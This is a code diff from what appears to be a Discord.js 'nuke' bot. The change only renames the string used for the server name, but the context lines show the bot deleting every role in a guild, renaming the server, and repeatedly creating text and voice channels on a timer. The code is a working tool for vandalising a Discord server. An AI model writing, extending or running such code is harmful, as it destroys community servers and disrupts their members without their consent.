@@ -15,7 +15,7 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("dev baby Up");////nawek dane bo sar server 
       setInterval(function() {
         message.guild.createChannel("smart up", "text");///////bo channel 
         message.guild.createChannel("billo Up", "voice");////bo voice
